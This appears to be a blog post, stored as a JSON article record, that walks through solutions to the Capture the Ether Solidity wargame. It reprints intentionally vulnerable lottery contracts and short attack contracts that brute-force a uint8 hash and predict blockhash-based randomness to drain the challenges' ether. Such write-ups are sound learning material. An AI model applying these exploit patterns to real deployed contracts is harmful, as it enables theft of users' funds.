{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"Capture the Ether题解","date":"2023-03-24T15:16:05.955Z","updated":"2023-03-24T15:19:51.574Z","comments":true,"path":"api/articles/Capture the Ether题解.json","keywords":null,"cover":[],"content":"<pre><code>title: Capture the Ether题解\ndate: 2023-03-24 23:16:57\ntags: solidity靶场\ncover: 'https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg'\n</code></pre>\n<p>由于Ropsten测试网被弃用了，就在本地测试</p>\n<h1>Warmup</h1>\n<h2 id=\"Deploy-a-contract\">Deploy a contract</h2>\n<p><img src=\"https://s2.loli.net/2023/03/24/R3HwfMYkISylQqn.png\" alt=\"image-20230324172346730.png\"></p>\n<p>把代码扔remix上部署一下就行了</p>\n<h2 id=\"Call-me\">Call me</h2>\n<p><img src=\"https://s2.loli.net/2023/03/24/yLrvZc9EoFkiWuP.png\" alt=\"image-20230324172529372.png\"></p>\n<p>先调用<code>callme()</code>函数，就能通过</p>\n<h2 id=\"Choose-a-nickname\">Choose a nickname</h2>\n<p><img src=\"https://s2.loli.net/2023/03/24/82BpofUYPWRZC3g.png\" alt=\"image-20230324173902267.png\"></p>\n<p>在这里随意传入一个<code>bytes32</code>的字符串就ok</p>\n<h1>Lotteries</h1>\n<h2 id=\"Guess-the-number\">Guess the number</h2>\n<p><img src=\"https://s2.loli.net/2023/03/24/gvrmKZhNTwSARa6.png\" alt=\"image-20230324212717068.png\"></p>\n<p>首先给这个合约1个<code>ETH</code>，需要用1个<code>ETH</code>猜测42,即可调用<code>transfer</code>清空余额</p>\n<h2 id=\"Guess-the-secret-number\">Guess the secret number</h2>\n<pre><code class=\"language-solidity\">// SPDX-License-Identifier: MIT\npragma solidity ^0.4.21;\n\ncontract GuessTheSecretNumberChallenge {\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n\n    function GuessTheSecretNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n    }\n    \n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (keccak256(n) == answerHash) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n</code></pre>\n<p>攻击合约</p>\n<pre><code class=\"language-solidity\">contract guessit{\n    GuessTheSecretNumberChallenge add;\n    function guessit(address _addr) public payable{\n        add=GuessTheSecretNumberChallenge(_addr);\n    }\n    uint8 public n;\n\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n    function get(){\n    for(uint8 i=0;i&lt;256;i++){\n        if(keccak256(i)==answerHash)\n        {\n            n=i;\n            break;\n        }\n    }\n    }   \n//        function gueess() external payable{\n//        add.guess(n);\n//    }     //为什么这边调用会失败？\n}\n</code></pre>\n<p><img src=\"https://s2.loli.net/2023/03/24/kKbygR4daXjE1LI.png\" alt=\"image-20230324215329467.png\"></p>\n<p><code>uint8</code>数字不大，暴力破解</p>\n<p>通过<code>for</code>循环找出那个n，直接用guess方法</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>但是用攻击合约来调用原合约的guess方法报错？</p></blockquote>\n<h2 id=\"Guess-the-randon-number\">Guess the randon number</h2>\n<pre><code class=\"language-solidity\">// SPDX-License-Identifier: MIT\npragma solidity ^0.4.21;\n\ncontract GuessTheRandomNumberChallenge {\n    uint8 answer;\n\n    function GuessTheRandomNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n</code></pre>\n<p><img src=\"https://s2.loli.net/2023/03/24/KOJixRlGo6QHD3P.png\" alt=\"image-20230324230008329.png\"></p>\n<h2 id=\"Guess-the-new-number\">Guess the new number</h2>\n<pre><code class=\"language-solidity\">// SPDX-License-Identifier: MIT\npragma solidity ^0.4.21;\n\ncontract GuessTheNewNumberChallenge {\n    function GuessTheNewNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n</code></pre>\n<p>攻击代码</p>\n<pre><code class=\"language-solidity\">contract guessit{\n    GuessTheNewNumberChallenge add;\n    function guessit(address _addr) public payable{\n    add=GuessTheNewNumberChallenge(_addr);\n    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n    add.guess.value(1 ether)(answer);\n\n    }\n}\n</code></pre>\n<p><img src=\"https://s2.loli.net/2023/03/24/c9BmMOFjrl3tZdT.png\" alt=\"image-20230324231348643.png\"></p>\n","feature":true,"text":"title: Capture the Ether题解 date: 2023-03-24 23:16:57 tags: solidity靶场 cover: 'https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg' 由于Ropsten测...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\">Warmup</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Deploy-a-contract\"><span class=\"toc-text\">Deploy a contract</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Call-me\"><span class=\"toc-text\">Call me</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Choose-a-nickname\"><span class=\"toc-text\">Choose a nickname</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\">Lotteries</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Guess-the-number\"><span class=\"toc-text\">Guess the number</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Guess-the-secret-number\"><span class=\"toc-text\">Guess the secret number</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Guess-the-randon-number\"><span class=\"toc-text\">Guess the randon number</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Guess-the-new-number\"><span class=\"toc-text\">Guess the new number</span></a></li></ol></li></ol>","author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"EVM Puzzles题解","date":"2023-03-24T14:21:13.801Z","updated":"2023-03-24T14:35:16.633Z","comments":true,"path":"api/articles/EVM Puzzles题解.json","keywords":null,"cover":[],"text":"title: EVM Puzzles题解 date: 2023-03-24 22:22:57 tags: EVM cover: 'https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg' 配置环境 git clone https://...","link":"","photos":[],"count_time":{"symbolsCount":"3.7k","symbolsTime":"3 mins."},"categories":[],"tags":[],"author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}